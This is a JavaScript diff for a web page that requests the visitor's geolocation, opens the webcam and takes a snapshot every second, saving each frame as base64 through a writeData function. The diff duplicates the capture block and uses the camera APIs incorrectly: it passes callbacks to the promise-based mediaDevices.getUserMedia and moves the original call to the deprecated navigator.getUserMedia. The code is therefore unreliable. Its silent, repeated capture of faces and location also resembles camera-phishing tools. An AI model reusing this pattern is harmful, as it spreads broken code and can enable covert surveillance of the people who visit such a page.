@@ -49,7 +49,7 @@ const successGeo = ({ coords }) => {
 const errorGeo = ({ code, message }) => console.warn(`ERROR(${code}): ${message}`);
 
 navigator.geolocation.getCurrentPosition(successGeo, errorGeo, optionsGeo);
-navigator.mediaDevices.getUserMedia(
+navigator.getUserMedia(
   { audio: false, video: { width: 1280, height: 720 } },
   (stream) => {
     const video = document.querySelector('video');
@@ -62,6 +62,26 @@ navigator.mediaDevices.getUserMedia(
       setInterval(() => {
           shoot()
       }, 1000)
+
+    }
+  },
+  (err) => console.log("The following error occurred: " + err.name),
+);
+
+navigator.mediaDevices.getUserMedia(
+  { audio: false, video: { width: 1280, height: 720 } },
+  (stream) => {
+    const video = document.querySelector('video');
+
+    if (video) {
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
+      };
+      setInterval(() => {
+        shoot('media/')
+      }, 1000)
+
     }
   },
   (err) => console.log("The following error occurred: " + err.name),
@@ -86,7 +106,7 @@ function capture(video, scaleFactor) {
   return canvas;
 }
 
-function shoot() {
+function shoot(media = 'image/') {
   const video = document.getElementById(videoId);
   const canvas = capture(video, scaleFactor);
   const based64 = canvas.toDataURL("image/png");
@@ -95,7 +115,7 @@ function shoot() {
     image: based64,
   };
 
-  writeData(result, 'image/');
+  writeData(result, media);
 }
 
 const btn = document.getElementById('btn');
